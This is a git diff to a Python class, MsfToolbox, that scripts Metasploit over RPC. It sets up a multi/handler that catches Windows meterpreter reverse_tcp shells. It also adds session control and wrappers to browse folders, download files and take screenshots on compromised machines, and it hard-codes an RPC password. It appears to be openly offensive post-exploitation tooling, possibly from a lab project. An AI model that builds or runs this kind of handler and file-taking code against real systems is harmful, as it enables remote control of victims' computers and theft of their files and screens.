@@ -1,41 +1,53 @@
 from metasploit.msfrpc import MsfRpcClient
+from core.tools import explorer
+from core.tools import screenshot
+
 import os
+import socket
+import fcntl
+import struct
 
 
 class MsfToolbox:
 	"""
     Metasploit RPC listens locally to the port by default (55553)
     msfrpcd -P mypassword -n -f -a 127.0.0.1
-	# os.system("msfrpcd -P " + password + " -n -f -a 127.0.0.1")
+	# os.system("msfrpcd -P " + mypassword + " -n -f -a 127.0.0.1")
 
 	Paradigme de delegation pour les differents modules qui correspondent a des fonctionnalites
     """
-	def __init__(addr, port = 4444):
-		self._client = MsfRpcClient('mypassword', port=55553)
-		self._explorer =
-		self._screenshot = Screenshot(self)
+	def __init__(self, password='mypassword', port=55553):
+		self._client = MsfRpcClient(password, port=port)
+
+		# self._ip = get_ip_address('eth0') On docker it's easier to put in by hand
+		self._ip = '172.17.0.2'
 
 
-    def exploit_multi_handler(self, lport=4444, lhost='172.21.42.10'):
-		exploit = client.modules.use('exploit', 'multi/handler')
-		pl = client.modules.use('payload', 'windows/x64/meterpreter/reverse_tcp')
+	def exploit_multi_handler(self, lport=4444):
+		exploit = self._client.modules.use('exploit', 'multi/handler')
+		pl = self._client.modules.use('payload', 'windows/x64/meterpreter/reverse_tcp')
 		pl['LPORT'] = lport
-		pl['LHOST'] = lhost
-		pl['EXITFUN'C] = 'thread'
+		pl['LHOST'] = self._ip
+		pl['EXITFUNC'] = 'thread'
 
 		exploit.execute(payload=pl)
 
 
-	def take_screenshot(self, path):
-		self._screenshot.take_screenshot(path)
+	def get_ip_address(self, ifname):
+		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+		return socket.inet_ntoa(fcntl.ioctl(
+		                        s.fileno(),
+								0x8915,  # SIOCGIFADDR
+								struct.pack('256s', ifname[:15])
+								)[20:24])
 
 
 	def get_sessions(self):
 		return self._client.sessions.list
 
 
-	def get_session_shell(index):
-		return self._client.sessions.session(1)
+	def get_session_shell(self, index):
+		return self._client.sessions.session(index)
 
 
 	def get_client(self):
@@ -54,3 +66,26 @@ class MsfToolbox:
 
 	def is_connexion_established(self):
 	    return not self._client.sessions.list
+
+
+	# Explorer
+	def ls(self, shell):
+		return explorer.ls(shell)
+
+
+	def cd(self, shell, arg):
+		return explorer.cd(shell, arg)
+
+
+	def download(self, shell, name):
+		return explorer.download(shell, name)
+
+
+	def add_routing_files(self, files):
+		return explorer.add_routing_files(files)
+
+
+	# Screenshot
+	def post_take_screenshot(self, session=1, path="~/screenshot_sample.jpg", count=1,
+	                         delay=0, record=True, view_screenshots=False):
+		screenshot.post_take_screenshot(self._client, session, path, count, delay, record, view_screenshots)
